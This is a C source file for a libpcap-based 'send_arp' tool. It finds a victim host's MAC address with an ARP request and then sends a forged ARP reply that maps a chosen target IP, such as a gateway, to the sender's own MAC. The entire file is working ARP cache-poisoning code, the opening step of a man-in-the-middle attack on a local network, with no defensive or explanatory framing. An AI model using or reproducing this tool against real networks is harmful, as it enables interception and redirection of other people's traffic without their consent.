#include <pcap.h>
#include <stdio.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <unistd.h>

#define BROADCAST 0xFF
#define UNKNOWN_MAC 0x00

int ip[4]={0,};
char my_mac[6];
char my_ip[16]={0,};
char t_mac[6];
char t_ip[16]={0,};
char s_mac[6];
char s_ip[16] = {0,};
unsigned char send_data[42];
pcap_t *handle;			/* Session handle */

struct arp_req
{
    u_int8_t eth_dmac[6];
    u_int8_t eth_smac[6];
    u_int16_t ether_type;

    u_int16_t arp_hw_type;
    u_int16_t arp_protocol_type;
    u_int8_t arp_hw_size;
    u_int8_t arp_protocol_size;
    u_int16_t arp_op_code;
    u_int8_t arp_smac[6];
    u_int8_t arp_sip[4];
    u_int8_t arp_tmac[6];
    u_int8_t arp_tip[4];
} req;

int get_my_info(char *dev)
{
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    strcpy(my_ip,inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    close(fd);
    return 0;
}
int getDecimalValueOfIPV4_String(char *input_ip)
{
    int i;
    int ip_pnt = 0;
    int cnt = 0;
    int pnt = 0;
    int tmp = 1;
    for(i = 0; i < 4; i ++)
        ip[i] = 0;
    while(1)
    {
        for(i = 0; i < strlen(input_ip)+1; i ++)
        {
            if(input_ip[i] == '.' || input_ip[i] == NULL)
            {
                for(int j = 0; j < cnt-1; j ++)
                    tmp *= 10;
                for(int j = pnt; j < i; j++)
                {
                    ip[ip_pnt] += tmp*(input_ip[j]-48);
                    tmp = tmp/10 + tmp%10;
                }
                pnt = i+1;
                cnt = 0;
                ip_pnt++;
            }
            else
                cnt += 1;

        }
        if(input_ip[i] == NULL || input_ip[i] > '9')
            break;
    }
    return 0;
}

int make_arp_req(char *s_mac, char *s_ip, char *t_mac, char *t_ip, int op)
{
    int i;
    struct arp_req req;
    getDecimalValueOfIPV4_String(s_ip);
    for(i = 0; i < 4; i ++)
        req.arp_sip[i] = ip[i];
    if(op == ARPOP_REQUEST)
    {
        for(i = 0; i < 6; i ++)
        {
            req.eth_smac[i] = s_mac[i];
            req.eth_dmac[i] = BROADCAST;
        }
        for(i = 0; i < 6; i ++)
        {
            req.arp_smac[i] = s_mac[i];
            req.arp_tmac[i] = UNKNOWN_MAC;
        }
    }
    else if(op == ARPOP_REPLY)
    {
        for(i = 0; i < 6; i ++)
        {
            req.eth_smac[i] = my_mac[i];
            req.eth_dmac[i] = s_mac[i];
        }
        for(i = 0; i < 6; i ++)
        {
            req.arp_smac[i] = my_mac[i];
            req.arp_tmac[i] = t_mac[i];
        }
    }

    req.ether_type = htons(ETHERTYPE_ARP);
    req.arp_hw_type = htons(ARPHRD_ETHER);
    req.arp_protocol_type = htons(ETHERTYPE_IP);
    req.arp_hw_size = 6;
    req.arp_protocol_size = 4;
    req.arp_op_code = htons(op);
    getDecimalValueOfIPV4_String(t_ip);
    for(i = 0; i < 4; i ++)
        req.arp_tip[i] = ip[i];

    memcpy(send_data, &req, sizeof(send_data));
    return 0;
}

int main(int argc, char *argv[])
{
    int i;
    int res;
    int cnt = 0;
    char *dev = NULL;
    u_char arp_data[100] = {0,};
    char recv_ip[20]={0,};
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    struct pcap_pkthdr *header;	/* The header that pcap gives us */
    struct ether_header *p_analyze;
    struct ether_arp *arp;
    const u_char *pkt_data;


    printf("\n");
    if(argc != 4)
    {
        printf("Usage : ./send_arp [interface] [sender_ip] [target_ip]\n");
        return 0;
    }

    dev = argv[1];
    for(i = 0; argv[2][i] != NULL; i ++)
        s_ip[i] = argv[2][i];
    for(i = 0; argv[3][i] != NULL; i ++)
        t_ip[i] = argv[3][i];

    get_my_info(dev);

    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    while(1){
        //Send & Capture Packet
        if(cnt == 0)
        {
            printf("Finding Sender..\n");
            make_arp_req(my_mac, my_ip, 0, s_ip, ARPOP_REQUEST);
            pcap_sendpacket(handle,send_data,sizeof(send_data));
        }
        else if(cnt == 1)
        {
            printf("---------------------------------\n");
            printf("Sending ARP Reply..\n");
            make_arp_req(my_mac, t_ip, s_mac, s_ip, ARPOP_REPLY);
            pcap_sendpacket(handle,send_data,sizeof(send_data));
            printf("Done!\n");
            break;
        }

        res = pcap_next_ex(handle, &header, &pkt_data);
        p_analyze = (struct ether_header *) pkt_data;
        if(res == 1 && ntohs(p_analyze->ether_type) == ETHERTYPE_ARP)
        {
            for(i = 0; i < 42; i ++)
                arp_data[i] = pkt_data[i];
            arp = (struct ether_arp*)(arp_data+14);
            if(ntohs(arp->arp_op) == ARPOP_REPLY)
            {
                inet_ntop(AF_INET, (void *)&arp->arp_spa,recv_ip,sizeof(recv_ip));
                if(strcmp(s_ip,recv_ip)==0)
                {
                    printf("---------------------------------\n");
                    printf("SENDER MATCH!\n");
                    cnt ++;
                    printf("MAC Address : ");
                    for(i = 0; i < ETH_ALEN; i ++)
                    {
                        printf("%02x",*((p_analyze->ether_shost)+i));
                        if(i < 5)
                            printf(":");
                        s_mac[i] = *((p_analyze->ether_shost)+i);
                    }
                    printf("\n");
                }
            }
        }
    }
    pcap_close(handle);
    return(0);
}
